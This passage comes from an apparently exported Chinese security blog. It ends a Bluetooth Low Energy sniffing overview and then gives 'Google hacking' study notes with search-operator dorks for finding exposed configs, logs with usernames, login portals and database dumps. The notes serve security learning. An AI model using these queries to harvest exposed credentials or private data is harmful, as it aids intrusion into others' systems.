<li>需要捕获到蓝牙的“连接建立”过程，对于已经建立好连接的蓝牙网络，无法从一个正在处理的进程中，嗅探到这个“微微网”里面的通信数据包</li>
</ul>
<h4 id="b-Ellisys-BEX400"><a href="#b-Ellisys-BEX400" class="headerlink" title="b. Ellisys BEX400"></a>b. Ellisys BEX400</h4><p>Ellisys公司的BLuetooth Explorer 400（简称“BEX400”），是个独特的蓝牙数据通信捕获系统。它使用了一个wideband的接收器，能够同时侦听蓝牙整个79MHz的所有频谱。通过这种无线接入方法，嗅探蓝牙数据包以及对蓝牙活动的评估变得很容易。在BEX400强大的宽带接收能力支持下，我们能够同时捕获蓝牙的所有活动，且无需指定“蓝牙设备地址”信息。此外，该设备在捕获一个“微微网”中的蓝牙通信数据时，既可以是在连接建立前，也可以在连接建立后</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984339-9c7ca780-ffa2-11e8-9052-bc6aa1aa6bd1.png" alt="img"></a></p>
<p>优点：</p>
<ul>
<li>对于BLE的流量捕获没有必须在建立连接前就开始嗅探的限制</li>
<li>能够同时侦听蓝牙的所有信道，且无需指定“蓝牙设备地址”信息</li>
</ul>
<p>缺点：</p>
<ul>
<li>价格极其昂贵</li>
<li>除价格外，几乎完全符合需求，暂未发现明显缺点</li>
</ul>
<h3 id="3-开源侦听工具Ubertooth"><a href="#3-开源侦听工具Ubertooth" class="headerlink" title="3. 开源侦听工具Ubertooth"></a>3. 开源侦听工具Ubertooth</h3><p>“超牙项目”（Project Ubertooth）是一个开源的硬件项目，由Great Scott Gadgets团队的Michael Ossmann开发。超牙的硬件系统，目前处于版本为1的阶段，称为“超牙一号”（Ubertooth One）。通过这个工具，可以创建属于自己的“传统蓝牙”和“低功耗蓝牙”底层通信数据包捕获工具。</p>
<p><a href="https://user-images.githubusercontent.com/11291711/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49984348-9e466b00-ffa2-11e8-93ae-59086af28fb8.jpeg" alt="img"></a></p>
<p>此外，Ubertooth的固件源代码，可以直接从github：<a href="https://github.com/greatscottgadgets/ubertooths">https://github.com/greatscottgadgets/ubertooth</a>下载到最新的发布版。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200928121643528.png" alt="image-20200928121643528"></p>
<p>优点：</p>
<ul>
<li>售价约120美元，比较亲民</li>
<li>本身是一个开源的硬件和软件工程，其设计目的就是用来进行蓝牙网络的嗅探，便于研究员和黑客使用</li>
<li>针对不同的蓝牙规范，具有不同的应对工具，支持传统蓝牙和低功耗蓝牙两种数据包的捕获</li>
<li>能够在混杂模式下进行跟踪，通过ubertooth-btle程序对捕获的数据包进行识别和匹配，进而确定“访问地址”、“循环冗余校验”初始值、“跳转间隔”、“跳转增量”等，并还原出数据包的值</li>
</ul>
<p>缺点：</p>
<ul>
<li>说是支持“传统蓝牙”，但其实只能捕获“基本速率蓝牙”在网络中的活动，并不支持后来的“增强速率蓝牙”在规范改进后的设备。不过这与我们的工作没有太大联系，主要关注的应是低功耗蓝牙</li>
</ul>
<h2 id="0x08-移动端工具"><a href="#0x08-移动端工具" class="headerlink" title="0x08 移动端工具"></a>0x08 移动端工具</h2><h3 id="1-Android手机抓取app蓝牙数据"><a href="#1-Android手机抓取app蓝牙数据" class="headerlink" title="1. Android手机抓取app蓝牙数据"></a>1. Android手机抓取app蓝牙数据</h3><h4 id="a-Android蓝牙HCI日志"><a href="#a-Android蓝牙HCI日志" class="headerlink" title="a .Android蓝牙HCI日志"></a><strong>a .Android蓝牙HCI日志</strong></h4><p>在部分Android机型为开发人员提供了保存蓝牙日志的选项，即可保存手机向设备发送的数据和设备响应的数据，打开方式如下：</p>
<p>开发者模式→蓝牙HCI日志</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930155140338.png" alt="image-20200930155140338"></p>
<p>不同的平台存放HCI log的路径会不一样，MTK存放HCI log的路径为<code>/sdcard/mtklog/btlog/btsnoop_hci.log</code>，高通的存放路径为<code>/sdcard/btsnoop_hci.log</code></p>
<p>如果上面提到的路径下都没有HCI log，还可以通过手机上的蓝牙配置文件<code>bt_stack.conf</code>来查看路径</p>
<p><code>bt_stack.conf</code>位于<code>/etc/bluetooth/路径下，HCI log路径通过</code>BtSnoopFileName=/sdcard/btsnoop_hci.log`来进行设置的</p>
<p>另外如果没有<code>bt_stack.conf</code>文件，设备也会在默认路径下生成日志：<code>/data/misc/bluetooth/logs/btsnoop_hci.log</code></p>
<p>之后导出到wireshark查看即可，如图清晰的展示了蓝牙各协议栈的内容，分析时候重点关注发送的数据内容即<code>Handle</code>、<code>uuid</code>、<code>Value</code>等值即可</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/49418350-b6590600-f7bc-11e8-8cea-fbd09c9c318c.png" alt="img"></p>
<h4 id="b-Bluez调试工具hcidump"><a href="#b-Bluez调试工具hcidump" class="headerlink" title="b. Bluez调试工具hcidump"></a><strong>b. Bluez调试工具hcidump</strong></h4><p>虽然Android 4.2已经将蓝牙协议栈替换为Bluedroid，但仍可使用BlueZ调试工具（需自行编译，或网上下载），且hcidump输出的数据与<code>开发者模式</code>里的<code>蓝牙HCI日志</code>基本一样，源码如下：</p>
<p><a href="https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1">https://android.googlesource.com/platform/external/bluetooth/bluez/+/android-4.1.2_r1</a></p>
<p>hcidump抓取 log :</p>
<ul>
<li>打开蓝牙</li>
<li>用adb shell 登陆android设备 并且用 <code>hcidump -w /sdcard/hcilog</code></li>
<li>开始测试</li>
<li>测试完成，停止hcidump</li>
<li>导出到wireshark分析 <code>hcilog</code> 文件</li>
</ul>
<h3 id="2-扫描器"><a href="#2-扫描器" class="headerlink" title="2. 扫描器"></a>2. 扫描器</h3><h4 id="a-LightBlue"><a href="#a-LightBlue" class="headerlink" title="a. LightBlue"></a>a. LightBlue</h4><p><code>LightBlue</code>使用简单，打开蓝牙和app，即自动扫描蓝牙设备，未连接之前，大部分设备都是<code>Unnamed</code>和<code>No services</code>，选择其中一个会尝试连接，连接成功后即可获取蓝牙设备的设备信息、UUID、服务等信息了，选择其中一个服务，还可以尝试对其读写数据</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161720845.png" alt="image-20200930161720845"></p>
<h4 id="b-nRF-Connect"><a href="#b-nRF-Connect" class="headerlink" title="b. nRF Connect"></a>b. nRF Connect</h4><p><code>nRF Connect</code>的使用方式和<code>LightBlue</code>基本一致，优点在于对设备服务信息展示更为直观：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200930161645370.png" alt="image-20200930161645370"></p>
<h2 id="0x09-针对利用蓝牙的应用攻击（私有协议）"><a href="#0x09-针对利用蓝牙的应用攻击（私有协议）" class="headerlink" title="0x09 针对利用蓝牙的应用攻击（私有协议）"></a>0x09 针对利用蓝牙的应用攻击（私有协议）</h2><p>目前针对私有协议的分析基本都是通过蓝牙dongle抓包例如CC2540，并且逆向app进行分析应用实现是否安全。</p>
<ul>
<li><a href="http://drops.xmd5.com/static/drops/tips-10109.html">YeeLight 2 代蓝牙灯泡，小爱爱智能跳蛋，小米手环</a></li>
<li><a href="https://future-sec.com/how-to-crack-a-ble-lock.html">如何破解一个蓝牙锁</a></li>
<li><a href="http://www.droidsec.cn/ble安全入门及实战（1）/">BLE安全入门及实战（1）</a></li>
<li><a href="https://www.secpulse.com/archives/75963.html">BLE安全入门及实战（2）</a></li>
<li><a href="https://www.secpulse.com/archives/76377.html">BLE安全入门及实战（3）</a></li>
<li><a href="https://blog.csdn.net/u013183495/article/details/51736605">体脂秤</a></li>
</ul>
<h2 id="0x10-可以研究的点"><a href="#0x10-可以研究的点" class="headerlink" title="0x10 可以研究的点"></a>0x10 可以研究的点</h2><p>经过多年的历史发展，蓝牙本身已经变成一个比较复杂的协议了，如果需要整理完整的攻击面需要对整个蓝牙的实现有很清晰的梳理，网上大部分的文章都是关于协议本身的，对于协议的实现还是说的不是很清楚。而且协议本身的发展方向就是IOT方向，例如GATT这种很明显就是支持物联网设备的协议。所以搞清BLE5.0在真实的物联网设备上的架构以及实现我认为非常关键。</p>
<h2 id="0x11-参考链接"><a href="#0x11-参考链接" class="headerlink" title="0x11 参考链接"></a>0x11 参考链接</h2><p><a href="https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/">https://xuanxuanblingbling.github.io/wireless/ble/2018/08/01/ble/</a></p>
<p><a href="http://www.gandalf.site/2019/02/ble.html">http://www.gandalf.site/2019/02/ble.html</a></p>
<p><a href="https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf">https://www.ndss-symposium.org/wp-content/uploads/2019/02/ndss2019_06B-4_Xu_paper.pdf</a></p>
<p><a href="http://drops.xmd5.com/static/drops/tips-10109.html">http://drops.xmd5.com/static/drops/tips-10109.html</a></p>
<p><a href="https://blog.csdn.net/u013183495/article/details/51736605">https://blog.csdn.net/u013183495/article/details/51736605</a></p>
<p><a href="https://www.secpulse.com/archives/75963.html">https://www.secpulse.com/archives/75963.html</a></p>
<h2 id="更新中…"><a href="#更新中…" class="headerlink" title="更新中…"></a>更新中…</h2>]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>BLE</tag>
        <tag>蓝牙</tag>
      </tags>
  </entry>
  <entry>
    <title>Google hacking</title>
    <url>/2018/03/23/WEB/Google-hacking/</url>
    <content><![CDATA[<ul>
<li><p><strong>Google hacking</strong></p>
<p>​                                      <strong>-ol4three</strong>                                                                                                                                             </p>
<p><strong>第一章 搜索基础知识</strong></p>
<p><strong>1.1Google搜索的黄金法则</strong></p>
<ul>
<li>Google<strong>限制搜索关键字最多为32个单词</strong></li>
<li>Google查询是不区分大小写的：     <strong>//or必须大写</strong></li>
<li>Google的通配符 ： *****    </li>
<li>Google保留忽略查询关键字的权利：Google会忽略一个搜索中的某些常用单词、字母和一些单独的数字。指出这些词汇常称为<strong>“停用词”</strong></li>
<li><strong>强制Google使用常见词汇的一种方法是把他们用引号引起来、或者在查询项之前加一个+号</strong></li>
</ul>
<a id="more"></a>

<p><strong>1.2Google使用布尔操作符和特殊字符</strong></p>
<ul>
<li><strong>AND</strong> ：这个操作符用于在查询中包含多个关键字  hacker and cracker (<strong>常用于防止过滤掉一些常用词</strong>)  <strong>// + == “and justice for all”</strong></li>
<li><strong>NOT</strong> ：这个操作符用于从查询中忽略一个关键字  hacker -golf  ;  hacker -phlegm    (<strong>从你的查询中删除那些令人厌恶的字符</strong>)</li>
</ul>
</li>
<li><p><strong>OR</strong>   ：这个操作符命令Google查找搜索中的一个或者另外一个关键字     <strong>//可以用 “|” 或者 OR 来代替   查询看作是一个从左到右的句子即可</strong></p>
<ul>
<li><strong>特殊字符</strong>： 特殊字符将被Google默认转化</li>
</ul>
<p><strong>1.3网站链接</strong></p>
<ul>
<li><a href="http://www.google.com">www.google.com</a>    <strong>Google的主页，大部分搜索的入口</strong></li>
<li><a href="http://groups.google.com">http://groups.google.com</a>        <strong>Google group页面</strong></li>
<li><a href="http://www.google.com/language/language_tools">www.google.com/language/language_tools</a>    <strong>各种语言和翻译选项</strong></li>
</ul>
</li>
<li><p><a href="http://www.google.com/advance_search">www.google.com/advance_search</a>        <strong>高级搜索表单</strong></p>
<ul>
<li><a href="http://www.google.com/preferences">www.google.com/preferences</a>        <strong>使用偏好设置</strong></li>
</ul>
<p><strong>第二章 高级搜索符</strong></p>
<p><strong>2.1简介</strong></p>
<ul>
<li><strong>intitle,allintitle</strong></li>
<li><strong>inurl,allinurl</strong></li>
<li><strong>filetype</strong></li>
<li><strong>allintext</strong></li>
<li><strong>site</strong></li>
<li><strong>link</strong></li>
<li><strong>inanchor</strong></li>
<li><strong>daterange</strong></li>
<li><strong>cache</strong></li>
<li><strong>info</strong></li>
<li><strong>related</strong></li>
<li><strong>phonebook</strong></li>
<li><strong>rphonebook</strong></li>
<li><strong>bphonebook</strong></li>
<li><strong>author</strong></li>
<li><strong>group</strong></li>
<li><strong>msgid</strong></li>
<li><strong>insubject</strong></li>
</ul>
</li>
<li><p><strong>stocks</strong></p>
<ul>
<li><strong>define</strong></li>
</ul>
<p><strong>2.2操作符语法</strong></p>
<ul>
<li>在操作符、冒号、搜索关键字之间是没有空格的</li>
</ul>
</li>
<li><p>如果用词组作为关键字的话，必须保证在操作符、冒号和词组的第一个引号之间没有任何空        格字符</p>
<ul>
<li>高级操作符能够和单独的查询混合使用</li>
</ul>
<p><strong>2.3Google高级操作符</strong></p>
<p><strong>2.3.1 Intitle与Allintitle:    在页面标题中搜索</strong></p>
<ul>
<li>在页面标题中查找字符串</li>
<li>能够很好地和其他操作符混合使用</li>
</ul>
</li>
<li><p>擅长搜索网页、Group、图片和新闻</p>
<ul>
<li>allintetle 在页面中查找所有的关键字（不能和其他混合使用）</li>
</ul>
<p><strong>2.3.2 Allintext: 在网页内容中查找关键字</strong></p>
<p><strong>2.3.3  Inurl 与 Allinurl: 在URL中查找文本</strong></p>
<ul>
<li>在页面的URL中查找字符串</li>
<li>能够很好地和其他操作符混合使用</li>
<li>擅长搜索网页加图片</li>
</ul>
</li>
<li><p>Allinurl 不能和其他操作符或者关键字混合使用</p>
<ul>
<li><strong>URL是统一资源定位符（简单来说它就是网页的地址）</strong></li>
</ul>
<p><strong>2.3.4 Site： 搜索精确到特定的站点</strong></p>
<ul>
<li>允许你仅在某个特定的网站或者特定的网站或者特定的域中搜索网页</li>
<li>能够很好地和其他操作符或者关键字混合使用，也可以单独使用</li>
</ul>
</li>
<li><p>擅长搜索网页，Group以及图片</p>
<ul>
<li>Google搜索是从右向左读取服务器名的</li>
</ul>
<p><strong>2.3.5Filetype： 搜索指定类型的文件</strong></p>
<ul>
<li>根据文件扩展名查找特定的文件</li>
<li>等同于ext</li>
<li>需要附加搜索关键字</li>
</ul>
</li>
<li><p>能够附加搜索关键字</p>
<ul>
<li>能够很好地和其他操作符混合使用</li>
</ul>
<p><strong>2.3.6 Link： 搜索与当前网页存在链接的网页</strong></p>
<ul>
<li>搜索链接到一个网站或者URL的链接</li>
<li>不能很好地和其他操作符和和搜索关键字混合使用</li>
<li>删除搜索网页、图片和新闻。</li>
</ul>
</li>
<li><p>必须提供一个完整的URL（包括协议、服务器、目录以及文件），或者一个部分URL</p>
<ul>
<li>当你提交一个无效的Link 给Google 他会当成一个词组来处理</li>
</ul>
<p><strong>2.3.7 Inanchor：在链接文本中查找文本</strong></p>
<ul>
<li>在链接描述文本中查找文本</li>
<li>能够很好地和其他操作符和搜索关键字混合使用</li>
</ul>
</li>
<li><p>擅长搜索网页、图片和新闻</p>
<ul>
<li>可以和其他操作符及搜索关键字混合使用</li>
</ul>
<p><strong>2.3.8 Cache： 显示网页的缓存版本</strong></p>
<ul>
<li>显示页面的缓存版本</li>
<li>不能很好地和其他操作符或者关键字混合使用</li>
</ul>
</li>
<li><p>擅长搜索网页</p>
<ul>
<li>eg： cache: blackhat.org</li>
</ul>
<p><strong>2.3.9 Numerange： 搜索数字</strong></p>
<ul>
<li>在某一特定范围内查找数字</li>
<li>能够很好地和其他操作符或搜索关键字混合使用</li>
</ul>
</li>
<li><p>擅长搜索网页</p>
<ul>
<li>与ext同效</li>
</ul>
<p><strong>2.3.10 Daterange： 查找在某个特定日期范围内发布的网页</strong></p>
</li>
<li><p>这个日期必须使用儒略历</p>
<ul>
<li>deterange操作符必须和其他搜索关键字或高级操作符同时使用</li>
</ul>
<p><strong>2.3.11 Info： 显示Google的摘要信息</strong></p>
<ul>
<li>该操作符的参数必须是一个有效的URL或者网站名。、</li>
</ul>
</li>
<li><p>info操作符不能和其他操作符或者搜索关键字混合使用</p>
<ul>
<li>显示网页的摘要信息</li>
</ul>
<p><strong>2.3.12 Related： 显示相关站点</strong></p>
<ul>
<li>显示与“提交的网站或URL相关的” 站点</li>
</ul>
</li>
<li><p>不能很多地和其他操作符或者关键字混合使用</p>
<ul>
<li>擅长搜索网页</li>
</ul>
<p><strong>2.3.13 Author： 搜索Groups中新闻组帖子的作者</strong></p>
<ul>
<li>搜索Group帖子的作者</li>
</ul>
</li>
<li><p>能够和其他混合使用</p>
<ul>
<li>擅长搜索Group</li>
</ul>
<p><strong>2.3.14 Group： 搜索Group标题</strong></p>
<p><strong>2.3.15 Insubject： 搜索Google group主题行</strong></p>
</li>
<li><p>在Group帖子的主题中查找字符串</p>
<ul>
<li>能够很好地和其他操作符或搜索关键字混合使用</li>
</ul>
<p><strong>2.3.16 Msgid： 通过消息ID来查找Group帖子</strong></p>
<ul>
<li>不能很好的和其他操作符混合使用</li>
</ul>
<p><strong>2.3.17 Stocks： 搜索股票信息</strong></p>
<p><strong>2.3.18 Define： 显示某个术语的定义</strong></p>
<ul>
<li>显示对提供的单词或者词组的各种定义</li>
</ul>
</li>
<li><p>不能很好地和其他操作符或者关键字混合使用</p>
<ul>
<li>擅长搜索网页</li>
</ul>
<p><strong>2.3.19 Phonebook: 搜索电话列表</strong></p>
<ul>
<li>rphonebook    住宅电话列表</li>
</ul>
</li>
<li><p>bphonebook    商业电话列表</p>
<ul>
<li>phone book    商业和住宅电话列表</li>
</ul>
<p><strong>2.4操作符冲突与糟糕的Search-Fu</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/3926.png" alt="0"></p>
<p><strong>2.5 网站链接</strong></p>
<ul>
<li>Google文件类型FAQ， <strong><a href="http://www.google.com/help/faq_filetypes.html">www.google.com/help/faq_filetypes.html</a></strong></li>
<li>文件扩展名信息资源，<strong><a href="http://www.filext.com">www.filext.com</a></strong>  这个网站能够帮助你找到某个特定的扩展名与何种程序相关联</li>
</ul>
</li>
<li><p><strong><a href="http://searchenginewatch.com/searchday/article.php/20160061">http://searchenginewatch.com/searchday/article.php/20160061</a></strong> 这篇文章讨论了和Google日期限定搜索选项有关的话题</p>
<ul>
<li>非常棒的在线Julian日期转换工具，<strong><a href="http://www.24hourtranslations.co.uk/dates.htm">www.24hourtranslations.co.uk/dates.htm</a></strong>和<strong><a href="http://www.tesre.bo.cnr.it/~mauro/JD/">www.tesre.bo.cnr.it/~mauro/JD/</a></strong></li>
</ul>
<p><strong>第三章 Google hacking基础</strong></p>
<p><strong>3.1 简介</strong></p>
</li>
<li><p>在浏览页面的缓存版本时。存在某种匿名隐藏的特征，来隐藏你的浏览行为</p>
<ul>
<li>本章我们将了解一种遍历技术， 学习： <strong>目录遍历</strong>、<strong>数字范围扩展</strong>以及<strong>扩展名搜索</strong></li>
</ul>
</li>
</ul>
<p>  <strong>3.2 使用缓存进行匿名浏览</strong></p>
<ul>
<li>Google会保存大部分他所抓取到的网页数据。虽然并不是都是如此而且这种情况也是可以防止的，但是大多数Google抓取的数据都被复制了一份，而且可以通过搜索结果页面的缓存链接来访问</li>
<li><a href="http://www.phrack.org">www.phrack.org</a></li>
<li>点击缓存链接斌不是只从Google的数据库中加载网页，他还会连接到真是的服务器以访问图片以及其他非HTML内容</li>
<li>在缓存URL的尾部添加<strong>&amp;**</strong>strip=1<strong>将只显示缓存网页的文本。以这种范式访问缓存页面不会连接到网站的真实服务器，而且如果你使用的是本章中提到的剪切和粘贴的方法，还能够保护你的</strong>匿名性**。<ul>
<li>tcpdump -n命令来抓捕这些数据</li>
</ul>
</li>
<li>也可以使用服务器网站 eg：atomintersoft |  samair.ru</li>
</ul>
<p>  <strong>3.3 目录列表</strong></p>
<ul>
<li>目录列表是一种能够列出网站服务器上存在的文件和目录的网页类型。</li>
</ul>
<p>  <strong>目录列表十分类似于FTP服务器</strong></p>
<ul>
<li>它们自身并不安全</li>
<li>它们显示出来的信息能够帮助攻击者了解网站服务器的某些特定技术细节<ul>
<li>它们无法区分公开的文件和那些私有的文件</li>
</ul>
</li>
<li>它们通常都是偶然显示出来的，这是因为许多网站服务器都是在顶层索引文件（index.htm、index.htm 、default.asp等）丢失或者无效的时候才会显示目录</li>
</ul>
<p>  <strong>3.3.1 查找目录列表</strong></p>
<ul>
<li><p>目录列表包含了大量很有价值的目录</p>
<ul>
<li>最好的查找包含目录列表页面的方法是使用诸如intitle:index.of “parent directory” 或者 intitle:index.of name size之类的查询</li>
</ul>
<p><strong>3.3.2 查找特定的目录</strong></p>
<ul>
<li>你可以很容易地在目录列表中查找特定的目录，而只需要index.of查询上加一个目录名即可。例如，intitle:index.of inurl:backup可以用来查找URL中含有单词backup的目录列表。如果URL中含有单词backup，那么很有可能这是一个目录名</li>
</ul>
<p><strong>3.3.3 查找特定的文件</strong></p>
<ul>
<li>你可以很容易地在目录列表中查找特定的文件： 只需要简单地在index.of查询中加入文件名即可，例如intitle:index.of ws_ftp.log</li>
</ul>
<p><strong>3.3.4 服务器版本</strong></p>
</li>
<li><p>某些服务器，尤其是Apache和Apache的派生服务器常常会在目录列表的底部加上一个服务器标志。这些服务器标志可以通过拓展index.of搜索来查找到，如intitle:index.of server.at</p>
<ul>
<li>你也可以搜索特定版本的web服务器，这是通过添加一个正确格式的服务器标志来实现的。例如， intitle:index.of server.at “Apache Tomcat/“ 能够找到运行各种版本的Apache Tomcat服务其的网站（<strong>同样的nmap也可以来识别</strong>）</li>
</ul>
<p><strong>3.4 险境：遍历技术</strong></p>
<p><strong>3.4.1  目录遍历</strong></p>
</li>
<li><p>一旦你在服务器上找到了某个特定的目录，就可以使用这个技术来查找其他的目录或者子目录</p>
<ul>
<li>完成这种任务的一个简单的办法就是利用目录列表。只要点击parent directory链接，就可以进入当前目录的上一级目录。如果该父目录仍包含其他的目录列表，那么你可以通过点击其链接来挖掘其他的目录。如果父目录没有显示目录列表，那么你可能就需要诉诸于一种更为复杂的方法了。即猜测目录名并把他们添加到父目录的URL的尾部。或者，考虑在Google搜索中使用site和Inurl关键词</li>
</ul>
<p><strong>3.4.2 递增置换</strong></p>
</li>
<li><p>递增置换是 “取一个数并用下一个更大的或者更小的数来代替这个数” 的形象的说法</p>
<ul>
<li>这个技术可以用于挖掘在目录名或者文件名中使用数字的站点。这种技术只需要用更大的或者更小的数来替代原来的数字，但是要注意保持文件名或者目录名中剩下的部分不变（注意那些零）。或者，在Google搜索中使用site，在加上inurl或者filetype关键字。</li>
</ul>
<p><strong>3.4.3 拓展遍历</strong></p>
<ul>
<li>这种技术可以用于查找文件名相同，而扩展名不同的文件（例如备份文件）</li>
</ul>
</li>
<li><p>实现拓展遍历技术最容易的方法是在URL中，用一种扩展名来替代另一种扩展名，例如，用bak代替html</p>
<ul>
<li>目录列表，尤其是缓存目录列表，是最容易判定备份文件是否存在的方法，也能够判定可能用于网站其他部分的扩展名</li>
</ul>
<p><strong>3.5 网站链接</strong></p>
<ul>
<li><strong><a href="http://www.all-nettools.com/pr.htm">www.all-nettools.com/pr.htm</a></strong>    一个简便的代理检查工具，它能够帮助你测试正在使用的代理服务器</li>
</ul>
</li>
<li><p><strong><a href="http://www.sensepost.com/research/wikto">http://www.sensepost.com/research/wikto</a></strong>    Sensepost的Wikto工具，一个很强大的web扫描工具，它还结合了使用Google hacking数据库的Google查询测试。</p>
<ul>
<li><strong>一个简单的Google搜索可以用来在不对站点管理员或侵入检测系统，并且搜集到的信息都可以在以后的评估中重复使用。</strong></li>
</ul>
<p><strong>第四章 文档加工和数据库挖掘</strong></p>
<p><strong>4.1 简介</strong></p>
</li>
<li><p>互联网上的文档都是有价值的。“好人”和“坏人”都可以利用在文档中的信息来达到他们各自的目的</p>
<ul>
<li>这章我们就来学习一下关于文档的挖掘</li>
</ul>
<p><strong>4.2 配置文件</strong></p>
<p><strong>4.2.1 基本信息：</strong></p>
<ul>
<li>配置文件能够向攻击者泄露<strong>敏感的信息</strong></li>
<li>尽管配置文件的文件名不同，但是仍可以通过文件的扩展名来找到配置的文件，例如<strong>INI、CONF、CONFIG、或CFG</strong></li>
<li>配置文件存储了程序的设置和程序的用法</li>
<li>对于配置文件来说攻击者可以根据其提供的各种信息来寻找相应的方法甚至继续在寻找更深的东西出来</li>
<li>对于搜索文件来说最好尝试用不同类型的搜索方法 eg:<strong>intitle:index.of ws_ftp.ini</strong> | <strong>filetype:ini inurl:ws_ftp.ini</strong> 都可以找到一些东西</li>
</ul>
</li>
<li><p>eg： <strong>filetype:conf inurl: firlwall</strong>  它可以搜索出防火墙的配置文件 </p>
<ul>
<li>eg： <strong>(inurl:conf OR inurl:config OR inurl:cfg)</strong>使用这样的联合搜索 正如一个攻击者知道你的配置文件的名称就可以通过filetype inutl 来更准确的寻找需要的文件 </li>
</ul>
<p><strong>4.2.2 对于一个Google黑客在搜索配置文件是应该注意的一些东西：</strong></p>
<ul>
<li>使用可用的配置文件中特有的单词或词组来创建一个强大的基本搜索</li>
<li>过滤掉sample example test howto tutorial单词以剔除明显的实例文件</li>
<li>用-cvs过滤掉CVS存储器，他们通常存放了默认的配置文件</li>
</ul>
</li>
<li><p>如果是搜索UNIX程序的配置文件，那么就要过滤掉manpage或者Manual</p>
<ul>
<li>搜索实例配置文件中最长改变的域，并且对该与执行缩简搜索、以提出可能的样例文件</li>
</ul>
<p><strong>4.2.3 配置文件搜索实例：</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4958.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4957.jpeg" alt="0"></p>
<p><strong>4.3 日志文件</strong></p>
<ul>
<li>日志文件记录了一些信息 甚至包括一些时间和 IP地址到用户名与口令 例如银行卡账号</li>
</ul>
</li>
<li><p>filetype:log inurl: log 或者是更简单的ext:log log</p>
<ul>
<li>下面列出一些日志文件搜索实例</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4972.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4974.jpeg" alt="0"></p>
<p><strong>filetype:log username putty</strong> 下图为搜索的结果该结果也可以在下一次<strong>继续使用</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4976.jpeg" alt="0"></p>
<p><strong>一些较为敏感的office文档：</strong></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4985.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4984.jpeg" alt="0"></p>
<p><strong>4.4 数据库挖掘</strong></p>
<ul>
<li>登陆入口，尤其是软件制造商提供的默认入口，是可以很容易就搜索到的 eg：login welcome copyright statements</li>
<li>位于服务器端和客户端的软件都有帮助文件， 这些文件会泄露关于应用程序配置和用法的信息</li>
</ul>
</li>
<li><p>不同的错误消息的内容都能用来剖析目标</p>
<ul>
<li>数据库转储已证明是所有数据库的发现中泄露信息最多的，因为他们包括完整的或者部分的数据哭内容，可以通过数据库转储的头部字符搜索来得到， eg: “#Dumping data for table”</li>
</ul>
<p><strong>4.4.1 登陆入口：</strong></p>
</li>
<li><p>搜索登陆入口 <strong>eg: inurl: admin | login</strong>  等</p>
<ul>
<li>下面是一些搜索的例子</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4994.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/4995.jpeg" alt="0"></p>
<p><strong>4.4.2 帮助文件</strong></p>
</li>
<li><p>其可能泄露机器名，用户名和明文口令</p>
<ul>
<li>下面是一些帮助文件的搜索</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5008.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5009.jpeg" alt="0"></p>
<p><strong>4.4.3 错误信息：</strong></p>
<ul>
<li>错误信息会泄露更多关于服务器上可能存在的漏洞的危险信息</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5016.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5018.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5017.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5015.jpeg" alt="0"></p>
<p><strong>4.4.4 数据库转储：</strong></p>
<ul>
<li>数据库的任意格式的输出都可以看做是数据库的转储 它可以泄露出很多信息</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5028.jpeg" alt="0"></p>
<p><strong>4.4.5 实际的数据库文件：</strong></p>
<ul>
<li>对于数据库存储文件来说 Google只适用于用一个特定的文件名或扩展名的文件来表示数据库</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5035.jpeg" alt="0"></p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/5034.jpeg" alt="0"></p>
<p><strong>4.6 网站链接：</strong></p>
<ul>
<li><strong><a href="http://www.filext.com">www.filext.com</a></strong>        一个关于文件扩展名信息的不错的资源。</li>
</ul>
</li>
<li><p><strong><a href="http://desktop.google.com">http://desktop.google.com</a></strong>        Google桌面搜索应用程序</p>
<ul>
<li><strong>http”//johnny.ihackstuff.com</strong>        Google hacking数据库的主页，在其中你可以找到更多的和本章中列出的那些搜索相近的搜索</li>
</ul>
<p><strong>4.7 一些感想</strong></p>
<ul>
<li>如果防止下载 .INC文件或者将扩展名改为.PHP 隐藏其中的内容</li>
</ul>
</li>
